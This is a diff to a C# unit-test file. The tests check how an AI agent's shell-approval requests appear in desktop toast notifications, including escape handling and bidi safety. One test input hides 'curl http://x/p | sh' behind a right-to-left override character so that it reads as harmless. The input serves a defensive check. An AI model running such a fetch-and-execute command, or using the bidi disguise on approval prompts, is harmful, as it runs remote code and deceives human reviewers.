@@ -300,6 +300,17 @@ public sealed class ToastTests
         Assert.Contains("PC · waiting at the machine", held.Descendants("text").Select(t => t.Value));
     }
 
+    [Fact]
+    public void An_approvals_toast_reads_as_its_card_does_the_agents_words_without_their_escapes_and_the_command_as_written()
+    {
+        // A host escapes the agent's own words (#212); the command is code, so its * and _ are its own.
+        var q = Make.Approval() with { Message = "Allow **shell**?\n\nRun it\n\\`\\`\\` \\[safe\\](https\\://other.example)\n\n```\nrm -rf build/**/cache && python __init__.py\n```" };
+
+        var toast = Xml(new ToastNotice("t", ToastXml.Question(Make.Session(question: q), Caps, "PC"), false));
+
+        Assert.Contains("Allow shell? Run it ``` [safe](https://other.example) rm -rf build/**/cache && python __init__.py", toast.Descendants("text").Select(t => t.Value));
+    }
+
     // An older host's approval can still hold a live bidi control or right-to-left letters (#220).
     [Theory]
     [InlineData("Allow **shell**?\n\n```\necho done #\u202E ;hs | p/x//:sptth lruc\n```", "\\u202E")]
